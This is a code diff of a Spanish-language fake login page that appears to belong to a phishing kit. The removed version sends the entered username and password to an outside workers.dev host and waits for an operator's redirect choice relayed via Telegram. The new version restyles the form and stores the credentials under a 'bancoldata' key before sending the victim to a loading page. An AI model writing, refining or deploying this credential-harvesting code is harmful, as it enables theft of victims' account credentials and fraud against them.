@@ -2,59 +2,80 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Login</title>
+  <style>
+    body {
+      background: #0d1b2a;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    form {
+      background: #1b263b;
+      padding: 30px;
+      border-radius: 12px;
+      width: 300px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+    }
+    h2 {
+      margin-top: 0;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 6px;
+      background: #415a77;
+      color: #fff;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 6px;
+      background: #00b4d8;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #0096c7;
+    }
+  </style>
 </head>
 <body>
-  <h2>Formulario de Login</h2>
 
   <form id="loginForm">
-    <label>Usuario: <input type="text" name="usuario" required></label><br><br>
-    <label>Clave: <input type="password" name="clave" required></label><br><br>
-    <button type="submit">Enviar</button>
+    <h2>Iniciar sesión</h2>
+    <input type="text" id="usuario" placeholder="Usuario" required>
+    <input type="password" id="clave" placeholder="Clave" required>
+    <button type="submit">Ingresar</button>
   </form>
 
-  <p id="estado"></p>
-
   <script>
-    const BASE_URL = "https://blue-night-7897.claropromoxlaro.workers.dev";
-
-    document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
       e.preventDefault();
-      const form = e.target;
-      const transactionId = crypto.randomUUID();
 
-      const datos = {
-        usuario: form.usuario.value,
-        clave: form.clave.value,
-        transactionId
-      };
+      const usuario = document.getElementById('usuario').value.trim();
+      const clave = document.getElementById('clave').value.trim();
 
-      try {
-        const res = await fetch(BASE_URL + "/login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(datos)
-        });
-        const json = await res.json();
-        if (!json.ok) throw new Error("Error en el envío");
+      if (!usuario || !clave) return;
 
-        document.getElementById("estado").textContent = "✅ Esperando respuesta...";
+      localStorage.setItem('bancoldata', JSON.stringify({ usuario, clave }));
 
-        // --- Esperar la opción elegida desde Telegram ---
-        const interval = setInterval(async () => {
-          const r = await fetch(`${BASE_URL}/status?id=${transactionId}`);
-          const status = await r.json();
-
-          if (status && status.opcionElegida) {
-            clearInterval(interval);
-            window.location.href = status.opcionElegida + ".html";
-          }
-        }, 2000);
-
-      } catch (err) {
-        document.getElementById("estado").textContent = "❌ Error: " + err.message;
-      }
+      // Redirigir a la página de cargando
+      window.location.href = "cargando.html";
     });
   </script>
+
 </body>
 </html>
